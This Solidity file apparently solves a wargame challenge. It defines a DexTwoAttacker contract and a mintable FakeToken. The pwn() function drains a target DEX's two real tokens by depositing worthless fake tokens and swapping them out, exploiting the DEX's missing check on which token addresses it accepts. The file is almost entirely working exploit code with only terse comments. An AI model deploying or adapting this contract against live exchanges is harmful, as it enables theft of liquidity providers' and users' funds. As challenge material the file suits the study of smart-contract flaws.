// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "hardhat/console.sol";

interface IDex {
    function token1() external view returns(address);
    function token2() external view returns(address);
    function getSwapAmount(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}

// interface IERC20 {
//     function balanceOf(address account) external view returns (uint256);
//     function transferFrom(address from, address to, uint256 amount) external;
//     function approve(address spender, uint256 amount) external;
//     function allowance(address owner, address spender) external view returns (uint256);
// }


contract DexTwoAttacker is Ownable{
    IDex public target;

    IERC20 public token1;
    IERC20 public token2;    
    IERC20 public fakeToken;

    constructor(address _owner, address _target, address _token1, address _token2) Ownable(_owner){
        target = IDex(_target);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }

    function setParams(address _target, address _token1, address _token2, address _faketoken) public onlyOwner{
        target = IDex(_target);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
        fakeToken = IERC20(_faketoken);
    }

    function setFake(address _faketoken) public onlyOwner{
        fakeToken = IERC20(_faketoken);
    }

    function getSwapAmount(address _from, address _to, uint256 _amount) external view returns (uint256) {
        return target.getSwapAmount(_from, _to, _amount);
    }

     function balanceOf(address _token, address _account) external view returns (uint256) {
        // return target.balanceOf(_token, _account);
        return IERC20(_token).balanceOf(_account);
     }

    function pwn() external onlyOwner {
        // Approve DexTwo to spend our fake token
        fakeToken.approve(address(target), type(uint).max);

        // Transfer enough FakeTokens to DexTwo
        fakeToken.transfer(address(target), 5);

        // Swap fake token for token1
        target.swap(address(fakeToken), address(token1), 5);

        // Swap fake token for token2
        target.swap(address(fakeToken), address(token2), 10);

    }

    function transferFrom(IERC20 _token, address _from, address _to, uint256 _amount) public onlyOwner {
        _token.transferFrom(_from, _to, _amount);
    }

    function _swap(IERC20 _tokenIn, IERC20 _tokenOut) private {
        target.swap(
            address(_tokenIn), 
            address(_tokenOut), 
            _tokenIn.balanceOf(address(this))
        );
    }
    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }
}

contract FakeToken is ERC20 {
    uint256 private initsup = 100;
    constructor(address _minter) ERC20("FakeToken", "FAKE") {
        _mint(_minter, initsup);
    }

}